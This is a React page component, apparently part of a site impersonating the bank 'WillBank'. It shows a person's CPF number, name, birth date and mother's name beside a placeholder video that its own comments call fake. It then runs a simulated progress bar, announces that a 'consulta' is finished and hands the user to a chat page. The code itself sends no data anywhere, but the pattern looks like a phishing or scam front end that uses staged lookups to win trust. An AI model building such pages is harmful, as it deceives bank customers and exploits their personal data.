import { useEffect, useState } from "react";
import { useNavigate, useLocation } from "react-router-dom";
import { CreditCard, User, Calendar, Users, Search, Volume2 } from "lucide-react";
import WillBankHeader from "@/components/WillBankHeader";
import WillBankCard from "@/components/WillBankCard";
import WillBankFooter from "@/components/WillBankFooter";
import { CPFData } from "@/lib/cpf";
import { Progress } from "@/components/ui/progress";

const Video = () => {
  const navigate = useNavigate();
  const location = useLocation();
  const [progress, setProgress] = useState(0);
  const [showConsulta, setShowConsulta] = useState(false);

  const cpfData: CPFData | undefined = location.state?.cpfData;

  useEffect(() => {
    if (!cpfData) {
      navigate("/");
      return;
    }

    // Simular progresso de loading
    const interval = setInterval(() => {
      setProgress(prev => {
        if (prev >= 100) {
          clearInterval(interval);
          setShowConsulta(true);
          // Após mostrar consulta, navegar para chat
          setTimeout(() => {
            navigate("/chat", { state: { cpfData } });
          }, 3000);
          return 100;
        }
        return prev + 1;
      });
    }, 50);

    return () => clearInterval(interval);
  }, [cpfData, navigate]);

  if (!cpfData) return null;

  const dataFields = [
    { icon: CreditCard, value: cpfData.cpf },
    { icon: User, value: cpfData.nome },
    { icon: Calendar, value: cpfData.dataNascimento },
    { icon: Users, value: cpfData.nomeMae },
  ];

  return (
    <div className="min-h-screen bg-background flex flex-col">
      <WillBankHeader userName={cpfData.nome.split(' ')[0].toUpperCase()} />

      <main className="flex-1 flex items-center justify-center p-4 sm:p-6">
        <WillBankCard className="w-full max-w-2xl">
          <div className="space-y-6">
            {/* Progress bar at top */}
            <Progress value={progress} className="h-2" />

            {/* Video Placeholder */}
            <div className="relative aspect-video bg-gradient-to-br from-slate-900 via-slate-800 to-slate-900 rounded-2xl overflow-hidden shadow-xl">
              {/* Fake video content */}
              <div className="absolute inset-0 flex items-center justify-center">
                <div className="text-center">
                  <div className="w-40 h-40 sm:w-48 sm:h-48 mx-auto bg-gradient-to-br from-primary to-amber-400 rounded-2xl flex items-center justify-center shadow-2xl">
                    <span className="text-5xl sm:text-6xl">👩‍💼</span>
                  </div>
                </div>
              </div>
              
              {/* Audio Button Overlay */}
              <button className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 bg-primary text-primary-foreground px-8 py-4 rounded-full flex items-center gap-3 font-bold shadow-2xl hover:bg-primary/90 hover:scale-105 transition-all duration-300">
                <Volume2 className="w-6 h-6" />
                Clique para ouvir
              </button>

              {/* Video controls */}
              <div className="absolute top-4 right-4 flex gap-2">
                <button className="bg-black/60 backdrop-blur-sm text-white px-3 py-1.5 rounded-lg text-xs font-medium hover:bg-black/80 transition-colors">
                  📋 Desanexar vídeo
                </button>
                <button className="bg-black/60 backdrop-blur-sm text-white px-3 py-1.5 rounded-lg text-xs font-medium hover:bg-black/80 transition-colors">
                  ⏭️ RGX
                </button>
              </div>
            </div>

            {/* User Data Card */}
            <div className="border-2 border-primary/40 rounded-2xl overflow-hidden shadow-sm">
              {/* Yellow top border already from Card */}
              <div className="divide-y divide-border/40">
                {dataFields.map((field, index) => {
                  const Icon = field.icon;
                  return (
                    <div key={index} className="flex items-center gap-4 p-4 hover:bg-muted/30 transition-colors">
                      <div className="w-11 h-11 bg-gradient-to-br from-primary/20 to-primary/10 rounded-xl flex items-center justify-center">
                        <Icon className="w-5 h-5 text-primary" />
                      </div>
                      <span className="font-semibold text-foreground">{field.value}</span>
                    </div>
                  );
                })}
                
                {/* Consulta Status */}
                <div className="flex items-center gap-4 p-4 bg-primary/5">
                  <div className="w-11 h-11 bg-primary/20 rounded-xl flex items-center justify-center">
                    <Search className={`w-5 h-5 text-primary ${!showConsulta ? 'animate-pulse' : ''}`} />
                  </div>
                  <span className={`font-medium ${showConsulta ? 'text-success' : 'text-muted-foreground'}`}>
                    {showConsulta ? "✓ Consulta finalizada!" : "Sua consulta está em andamento..."}
                  </span>
                </div>
              </div>
            </div>
          </div>
        </WillBankCard>
      </main>

      <WillBankFooter />
    </div>
  );
};

export default Video;
